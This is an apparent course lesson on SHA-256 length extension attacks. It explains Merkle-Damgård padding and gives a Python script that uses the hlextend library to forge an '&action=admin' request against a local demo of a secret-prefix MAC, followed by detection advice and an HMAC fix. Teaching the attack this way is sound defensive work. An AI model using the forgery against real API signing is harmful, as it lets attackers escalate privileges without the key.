---
title: "Length Extension Attack — SHA-2 Construction Weakness"
tags: [cryptography, length-extension, SHA-256, SHA-512, HMAC, Merkle-Damgård,
  CWE-310, T1600, hash-mac, forgery, API-signing]
module: 09-Crypto-01
day: 564
prerequisites:
  - Day 030 — Hashing, Collisions and Length Extension
  - Day 031 — MACs, HMACs and Forgery Lab
related_topics:
  - Length Extension Lab (Day 565)
  - Timing Attacks (Day 563)
  - RSA Attack Lab (Day 567)
---

# Day 564 — Length Extension Attack

> "SHA-256 is not a MAC. That statement is not a subtle point — it is the
> entire lesson. Using a hash to authenticate data is like using a screen door
> as a vault. The hash was never designed to resist forgery. HMAC was."
>
> — Ghost

---

## Goals

- Understand the Merkle-Damgård construction that makes SHA-1/SHA-2 vulnerable
  to length extension.
- Derive the mathematical condition that enables the attack.
- Implement the attack to forge a signed API request without knowing the key.
- Map this to real CVEs and understand why HMAC is the correct construction.

**Prerequisites:** Day 030 (SHA family, Merkle-Damgård), Day 031 (HMAC structure).
**Estimated study time:** 3 hours.

---

## 1. Recon — The Merkle-Damgård Construction

### How SHA-256 Processes Input

SHA-256 operates on 512-bit (64-byte) blocks. It maintains an internal state
of eight 32-bit words (256 bits total). For each block, the compression function
updates the state:

```
H₀ = initial_vector  (eight fixed constants)
H₁ = compress(H₀, block₁)
H₂ = compress(H₁, block₂)
...
Hₙ = compress(Hₙ₋₁, blockₙ)

SHA-256(message) = Hₙ
```

The final digest **is the internal state** after all blocks are processed.

### The Padding

Before hashing, the message is padded to a multiple of 512 bits:

```
message || 0x80 || 0x00...0x00 || message_length_in_bits (64-bit big-endian)
```

Example: "hello" (5 bytes = 40 bits):
```
68 65 6c 6c 6f          ← "hello"
80                      ← padding start byte
00 00 00 00 00 00 00    ← zero padding
00 00 00 00 00 00 00 00 ← more zeros
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 28 ← 0x28 = 40 bits
```
Total: 64 bytes = one 512-bit block.

---

## 2. Exploit — The Extension Property

### The Vulnerability

Given `H = SHA-256(secret || message)`, an attacker who knows `H`, `message`,
and the length of `secret` can compute:

```
H' = SHA-256(secret || message || padding || extension)
```

**without knowing `secret`**.

**Why?** Because SHA-256 is streaming — the attacker can initialise the
SHA-256 state to `H` (the leaked digest) and feed it `extension` as the next
block. This is valid because `secret || message || padding` is already
one complete hashed unit.

### The Attack in Detail

Suppose an API uses `MAC = SHA256(secret + request_params)` and returns the
MAC to the user.

The attacker has:
- The original signed data: `data = "user=alice&action=read"`
- The MAC: `mac = SHA256(secret || data)`
- The secret length: `len_secret` (often inferrable from the MAC format or
  through trial and error)

The attacker wants to forge a valid MAC for:
- Extended data: `data || padding || "&action=admin"`

Step by step:
```
1. Compute the padding that was appended to (secret || data):
   padded_length = len(secret) + len(data) + padding
   → This is the first "message" that SHA-256 processed.

2. Initialise a SHA-256 object with the state H (initialise the internal
   registers to the bytes of the known MAC).

3. Feed it the extension: "&action=admin"

4. The resulting digest = SHA256(secret || data || padding || "&action=admin")
   This is a valid MAC for the combined payload.

5. Submit: data_extended = data || padding || "&action=admin"
          mac_extended   = H'  (computed above)
   The server will compute SHA256(secret || data_extended) and it will match H'.
```

---

## 3. Minimal Exploit

```python
#!/usr/bin/env python3
"""
length_extension.py — SHA-256 length extension attack

No external libraries needed — uses only hashlib internals.
"""
from __future__ import annotations

import struct
import hashlib

# ── SHA-256 internal state manipulation ───────────────────────────────────

def sha256_padding(message_length_bytes: int) -> bytes:
    """
    Produce the PKCS-style padding that SHA-256 appends.
    message_length_bytes: the total length of the message BEFORE padding.
    """
    bit_length = message_length_bytes * 8
    padding = b"\x80"
    # Pad to (56 mod 64) bytes — leaves room for the 8-byte length
    padding += b"\x00" * ((55 - message_length_bytes) % 64)
    padding += struct.pack(">Q", bit_length)
    return padding

class SHA256State:
    """
    A SHA-256 object initialised to an arbitrary internal state.
    Used to continue hashing from a known digest value.
    """
    def __init__(self, state_hex: str, bytes_already_processed: int):
        """
        state_hex: hex string of the known SHA-256 digest (64 chars)
        bytes_already_processed: the byte count fed to SHA-256 before
                                  the state was captured
                                  = len(secret) + len(message) + len(padding)
        """
        # Parse the 8 state words from the digest
        digest_bytes = bytes.fromhex(state_hex)
        self._state = list(struct.unpack(">8I", digest_bytes))
        self._processed = bytes_already_processed
        self._buffer = b""

    def update(self, data: bytes) -> None:
        """Feed more data into the SHA-256 state."""
        # We use hashlib's internal C implementation by constructing a
        # synthetic message that is pre-padded.
        # For educational purposes, we re-implement the state injection
        # using ctypes or a pure Python SHA-256.
        # In practice, use hashlib_extensible or the hlextend library.
        self._buffer += data

    def hexdigest(self) -> str:
        """
        Compute the final digest by hashing the buffered data
        starting from the captured state.
        """
        # Full implementation requires either ctypes into _hashlib or
        # a pure Python SHA-256. See hlextend library for production use.
        # Here we demonstrate the concept with hlextend:
        raise NotImplementedError(
            "Use the hlextend library for actual state injection — see below"
        )


# ── Production implementation using hlextend ──────────────────────────────
# pip install hlextend

def length_extension_attack(
    known_mac: str,
    secret_len: int,
    original_data: bytes,
    extension: bytes,
) -> tuple[bytes, str]:
    """
    Forge a valid SHA-256 MAC using the length extension property.

    Returns:
      (forged_data, forged_mac)
      where forged_data = original_data || padding || extension
      and   forged_mac  = SHA256(secret || forged_data)
    """
    import hlextend  # pip install hlextend

    sha = hlextend.new("sha256")

    # The attack:
    # 1. sha.extend() takes the known MAC, the extension, the secret length,
    #    and the original data to compute the forged MAC and the padded data.
    forged_mac, forged_data = sha.extend(
        extension,          # bytes to append
        original_data,      # the original signed data (without secret)
        secret_len,         # length of the secret key
        known_mac,          # known MAC = SHA256(secret || original_data)
        raw=True,
    )
    return forged_data, forged_mac

# ── Demonstration ──────────────────────────────────────────────────────────

import os

def vulnerable_mac(secret: bytes, data: bytes) -> str:
    """Vulnerable: uses SHA256(secret || data) as a MAC."""
    return hashlib.sha256(secret + data).hexdigest()

def verify_mac(secret: bytes, data: bytes, mac: str) -> bool:
    return hashlib.sha256(secret + data).hexdigest() == mac

# Setup
SECRET = b"mysecretkey"  # Attacker does not know this
ORIGINAL_DATA = b"user=alice&action=read"
EXTENSION = b"&action=admin"

# Attacker receives the MAC for the original request
original_mac = vulnerable_mac(SECRET, ORIGINAL_DATA)
print(f"[*] Original data:  {ORIGINAL_DATA!r}")
print(f"[*] Original MAC:   {original_mac}")

# Attacker knows: original_data, original_mac, and secret_len
# (secret_len = 11, often guessable from the MAC format or by trial)
SECRET_LEN = 11

forged_data, forged_mac = length_extension_attack(
    known_mac=original_mac,
    secret_len=SECRET_LEN,
    original_data=ORIGINAL_DATA,
    extension=EXTENSION,
)

print(f"\n[+] Forged data:    {forged_data!r}")
print(f"[+] Forged MAC:     {forged_mac}")

# Verify the forge works against the server
is_valid = verify_mac(SECRET, forged_data, forged_mac)
print(f"\n[+] MAC valid on server: {is_valid}")
# → True — forge succeeded without knowing the secret!
```

---

## 4. Real-World Cases

### Flickr API (2009)

Flickr's API authentication used `SHA1(secret + params)`. Researchers demonstrated
that any signed request could be extended to add arbitrary parameters — including
forging administrative API calls — by appending parameters after the padding.

### Amazon AWS S3 (2008)

Early versions of AWS S3 REST authentication used `HMAC-SHA1(secret, canonicalString)`.
While HMAC is not vulnerable to length extension, a configuration bug in one
endpoint allowed the query string to be appended after the canonicalised
string was signed — effectively recreating the vulnerability at the application
layer rather than the cryptographic layer.

### Joomla, Drupal, WordPress Plugin (various)

Multiple PHP plugins used `md5($secret . $data)` or `sha1($secret . $data)` for
token generation. Length extension allows forging tokens for any data.

---

## 5. Detect

```
# Signature in API logs:
# The forged request contains padding bytes (0x80, 0x00...0x00, length-bytes)
# embedded in the parameter values.

# Padding for a 16-byte secret + 22-byte message = 38 bytes total:
# The attacker's forged request will contain:
# user=alice&action=read%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00
# %00%00%00%00%00%00%01%30&action=admin
#
# Detection: 0x80 byte followed by 0x00 bytes in a parameter value.
# This sequence is not valid UTF-8 and should never appear in legitimate
# URL-encoded parameters.
```

---

## 6. Harden — Fix

#### Vulnerable Pattern

```python
# BAD: SHA-256 used as MAC
def sign(secret: bytes, data: bytes) -> str:
    return hashlib.sha256(secret + data).hexdigest()
```

#### Fixed Pattern

```python
# GOOD 1: HMAC-SHA256 — not vulnerable to length extension
import hmac
import hashlib

def sign(secret: bytes, data: bytes) -> str:
    return hmac.new(secret, data, hashlib.sha256).hexdigest()

# Why HMAC is safe:
# HMAC(key, message) = H((key XOR opad) || H((key XOR ipad) || message))
# The outer hash wraps the inner hash — appending data to 'message'
# does not allow computing the outer hash without knowing 'key'.
# The length extension property is broken by the two-layer construction.

# GOOD 2: SHA-3 (Keccak) — sponge construction, not Merkle-Damgård
# SHA-3 is not vulnerable to length extension by design.
import hashlib
def sign_sha3(secret: bytes, data: bytes) -> str:
    return hashlib.sha3_256(secret + data).hexdigest()
    # Safe because Keccak does not expose internal state in its output.
```

**Rule:** Never use `SHA-256(secret || data)` as a MAC. Always use HMAC.
HMAC-SHA256 is the standard. SHA-3 as a secret-prefix MAC is also safe.

---

## Key Takeaways

1. SHA-256 is a hash function, not a MAC. A MAC requires a specific construction
   that prevents forgery. HMAC is that construction. Never substitute one for
   the other.
2. Length extension attacks are easy to exploit and the only prerequisite is
   knowing the MAC of any one message. This makes them high-impact vulnerabilities
   in API authentication schemes.
3. The fix requires no performance trade-off: HMAC-SHA256 is as fast as SHA-256
   and completely eliminates the length extension vulnerability.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q564.1, Q564.2 …).

---

## Navigation

← Previous: [Day 563 — Timing Attacks](DAY-0563-Timing-Attacks.md)
→ Next: [Day 565 — Length Extension Lab](DAY-0565-Length-Extension-Lab.md)
